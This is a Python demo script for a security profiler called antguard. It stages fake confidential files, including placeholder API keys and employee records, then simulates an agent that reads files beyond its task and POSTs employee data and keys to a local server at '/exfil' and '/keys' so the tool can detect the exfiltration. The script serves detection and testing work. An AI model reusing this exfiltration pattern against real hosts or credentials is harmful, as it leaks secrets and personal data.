"""
antguard Demo 5: Full Security Audit
======================================
Complete end-to-end demo combining ALL antguard features:
- File monitoring + fingerprinting
- Network boundary detection
- Process tree monitoring
- Byte-flow correlation
- Runtime metrics (CPU/GPU/memory)
- Anomaly detection

This is the showcase demo. Run this first.

Run: python demo_05_full_audit.py
"""

import os
import sys
import time
import json
import math
import tempfile
import subprocess
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from antguard import Guard


class _QuietHandler(BaseHTTPRequestHandler):
    received = []
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        _QuietHandler.received.append(body)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")
    def log_message(self, *args):
        pass


def run_server(port):
    srv = HTTPServer(("127.0.0.1", port), _QuietHandler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return srv


def print_header(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}\n")


def main():
    print_header("antguard Full Security Audit Demo")
    print("  Guard. Detect. Protect.")
    print("  Pure system-level profiler. No AI. No API. No cloud.\n")

    port = 18081
    server = run_server(port)

    with tempfile.TemporaryDirectory() as tmpdir:
        # setup directories
        conf_dir = os.path.join(tmpdir, "confidential")
        out_dir = os.path.join(tmpdir, "output")
        log_dir = os.path.join(tmpdir, "audit_logs")
        os.makedirs(conf_dir)
        os.makedirs(out_dir)

        # create confidential files
        files_created = {}

        f1 = os.path.join(conf_dir, "employee_data.csv")
        with open(f1, "w") as f:
            content = (
                "CONFIDENTIAL - Ant Technologies Pvt Ltd\n"
                "Employee Database Export - August 2026\n\n"
                "ID,Name,Role,Salary,Aadhaar,Email\n"
                "E001,Ravi Kumar,Senior Engineer,2500000,1234-5678-9012,ravi@ant.tech\n"
                "E002,Priya Shah,Engineering Manager,3200000,9876-5432-1098,priya@ant.tech\n"
                "E003,Amit Patel,Director of AI,4500000,5555-6666-7777,amit@ant.tech\n"
                "E004,Deepa Nair,VP Engineering,6000000,8888-9999-0000,deepa@ant.tech\n"
                "E005,Suresh Iyer,ML Engineer,2200000,1111-2222-3333,suresh@ant.tech\n"
            )
            f.write(content)
        files_created["employee_data.csv"] = len(content)

        f2 = os.path.join(conf_dir, "financial_report.txt")
        with open(f2, "w") as f:
            content = (
                "RESTRICTED - Q3 2026 Financial Summary\n"
                "Revenue: 12,50,00,000\n"
                "Operating Costs: 8,30,00,000\n"
                "Net Profit: 4,20,00,000\n"
                "Runway: 18 months\n"
                "Next Funding: Series B target 50Cr\n"
            )
            f.write(content)
        files_created["financial_report.txt"] = len(content)

        f3 = os.path.join(conf_dir, "api_keys.env")
        with open(f3, "w") as f:
            content = (
                "OPENAI_API_KEY=sk-proj-EXAMPLE12345\n"
                "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"
                "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/EXAMPLE\n"
                "DATABASE_URL=postgresql://admin:secret@db.ant.tech:5432/prod\n"
                "ANTHROPIC_API_KEY=sk-ant-EXAMPLE67890\n"
            )
            f.write(content)
        files_created["api_keys.env"] = len(content)

        print("Confidential files created:")
        for fname, size in files_created.items():
            print(f"  {fname} ({size} bytes)")

        print(f"\nFake external server: 127.0.0.1:{port}")
        print("\nStarting antguard profiler...")
        print("-" * 60)

        # === START ANTGUARD ===
        with Guard(
            watch=[conf_dir],
            detect_outbound=True,
            track_processes=True,
            correlate=True,
            runtime=True,
            gpu=True,
            log_path=log_dir,
            runtime_interval=0.5,
            network_interval=0.5,
            process_interval=0.5,
        ) as g:

            # SCENARIO A: Normal behavior
            print_header("Scenario A: Normal Agent Behavior")
            print("[Agent] Reading employee_data.csv...")
            with open(f1, "r") as f:
                emp_data = f.read()
            time.sleep(0.5)

            print("[Agent] Creating summary (no sensitive data)...")
            summary = f"Employee count: {emp_data.count('E00')}\nReport generated locally.\n"
            summary_file = os.path.join(out_dir, "summary.txt")
            with open(summary_file, "w") as f:
                f.write(summary)
            print("[Agent] Summary saved to output/summary.txt")
            print("[Result] Normal behavior - file read, local write only")
            time.sleep(1)

            # SCENARIO B: Suspicious file access
            print_header("Scenario B: Suspicious File Access")
            print("[Agent] Reading api_keys.env (unexpected)...")
            with open(f3, "r") as f:
                keys_data = f.read()
            time.sleep(0.5)

            print("[Agent] Reading financial_report.txt (unexpected)...")
            with open(f2, "r") as f:
                finance_data = f.read()
            print("[Result] Agent accessed sensitive files beyond its task scope")
            time.sleep(1)

            # SCENARIO C: Process spawning
            print_header("Scenario C: Suspicious Process Execution")
            print("[Agent] Spawning subprocess to list files...")
            try:
                subprocess.run(
                    [sys.executable, "-c", "import os; print(os.listdir('.'))"],
                    capture_output=True, text=True, timeout=5,
                )
            except Exception:
                pass
            time.sleep(1)

            # SCENARIO D: Data exfiltration attempt
            print_header("Scenario D: Data Exfiltration Attempt")
            print("[Agent] Sending employee data to external server...")
            try:
                import urllib.request
                req = urllib.request.Request(
                    f"http://127.0.0.1:{port}/exfil",
                    data=emp_data.encode(),
                    method="POST",
                )
                urllib.request.urlopen(req, timeout=5)
                print("[Agent] Data sent!")
            except Exception as e:
                print(f"[Agent] Send attempted ({e})")
            time.sleep(1)

            print("[Agent] Sending API keys to external server...")
            try:
                req = urllib.request.Request(
                    f"http://127.0.0.1:{port}/keys",
                    data=keys_data.encode(),
                    method="POST",
                )
                urllib.request.urlopen(req, timeout=5)
                print("[Agent] Keys sent!")
            except Exception as e:
                print(f"[Agent] Send attempted ({e})")
            time.sleep(1)

            # SCENARIO E: Heavy computation
            print_header("Scenario E: Resource-Heavy Computation")
            print("[Agent] Running heavy computation...")
            result = 0
            for i in range(300_000):
                result += math.sin(i) * math.cos(i)
            print(f"[Agent] Computation complete (result: {result:.2f})")
            time.sleep(1)

            print("\n" + "-" * 60)
            print("All scenarios complete. Stopping profiler...\n")

        # === RESULTS ===
        print_header("ANTGUARD SECURITY AUDIT RESULTS")

        data_left = g.did_data_leave()
        risk = g.risk_level()

        # top-level verdict
        if data_left:
            print("  ██████████████████████████████████████")
            print("  ██  DATA LEFT SYSTEM: YES          ██")
            print("  ██  OVERALL RISK: {:18s}██".format(risk.name))
            print("  ██████████████████████████████████████")
        else:
            print("  DATA LEFT SYSTEM: NO")
            print(f"  OVERALL RISK: {risk.name}")

        # summary counts
        print(f"\n  File events:      {len(g.file_events()):>4}")
        print(f"  Network events:   {len(g.net_events()):>4}")
        print(f"  Process events:   {len(g.proc_events()):>4}")
        print(f"  Correlations:     {len(g.correlations()):>4}")
        print(f"  Matched files:    {len(g.matched_files()):>4}")

        # file events breakdown
        print(f"\n--- File Events ---")
        for ev in g.file_events():
            marker = ""
            if "api_keys" in ev.path or "financial" in ev.path:
                marker = " <-- unexpected access"
            print(f"  [{ev.action.name:8s}] {os.path.basename(ev.path)}"
                  f"  {ev.size_bytes:>6} bytes  {ev.risk.name}{marker}")

        # network events
        if g.net_events():
            print(f"\n--- Network Events ---")
            for ev in g.net_events():
                print(f"  [{ev.risk.name:8s}] {ev.destination}:{ev.port}"
                      f"  sent={ev.bytes_sent} bytes"
                      f"  external={ev.is_external}"
                      f"  first_seen={ev.first_seen}")

        # process events
        suspicious = [e for e in g.proc_events()
                      if e.risk.name in ("MEDIUM", "HIGH", "CRITICAL")]
        if suspicious:
            print(f"\n--- Suspicious Processes ---")
            for ev in suspicious:
                print(f"  [{ev.risk.name:8s}] {ev.name} (pid {ev.pid})"
                      f"  parent={ev.parent_name}"
                      f"  type={ev.event_type.name}")

        # correlations
        if g.correlations():
            print(f"\n--- Byte-Flow Correlations ---")
            for m in g.correlations():
                print(f"  {os.path.basename(m.source_file)}"
                      f" -> {m.destination}:{m.destination_port}"
                      f"  confidence={m.confidence:.2f}"
                      f"  method={m.method}"
                      f"  risk={m.risk.name}")

        # runtime
        metrics = g.runtime_metrics()
        if metrics:
            print(f"\n--- Runtime Metrics ---")
            print(f"  Duration:       {metrics.duration_sec:.1f}s")
            print(f"  CPU avg/peak:   {metrics.cpu_avg:.1f}% / {metrics.cpu_peak:.1f}%")
            print(f"  Memory peak:    {metrics.memory_peak_bytes / (1024**3):.2f} GB")
            print(f"  Process RSS:    {metrics.process_rss_peak / (1024**2):.1f} MB peak")
            if metrics.gpu_avg_util >= 0:
                print(f"  GPU util:       {metrics.gpu_avg_util:.1f}%")
            if metrics.anomalies:
                print(f"  Anomalies:")
                for a in metrics.anomalies:
                    print(f"    {a}")

        # fingerprints
        fps = g.fingerprints()
        print(f"\n--- File Fingerprints ({len(fps)}) ---")
        for path, info in fps.items():
            print(f"  {os.path.basename(path):25s} sha256:{info['hash'][:24]}...")

        # data flow map
        dfm = g.data_flow_map()
        print(f"\n--- Data Flow Map ---")
        print(f"  Files accessed: {len(dfm['files_accessed'])}")
        print(f"  Outbound: {len(dfm['outbound'])}")
        for out in dfm["outbound"]:
            print(f"    -> {out['destination']} ({out['bytes_sent']} bytes)")
        print(f"  Correlations: {len(dfm['correlations'])}")

        # save reports
        paths = g.save(log_dir)
        print(f"\n--- Reports Saved ---")
        for fmt, path in paths.items():
            size = os.path.getsize(path)
            print(f"  {fmt:4s}: {os.path.basename(path)} ({size} bytes)")

        # print full text report
        print("\n" + "=" * 60)
        print("FULL TEXT REPORT")
        print("=" * 60)
        with open(paths["txt"]) as f:
            print(f.read())

        # one-liner
        print(f"\nOne-line: {g.summary()}")

    server.shutdown()
    print("\nDemo complete.")


if __name__ == "__main__":
    main()
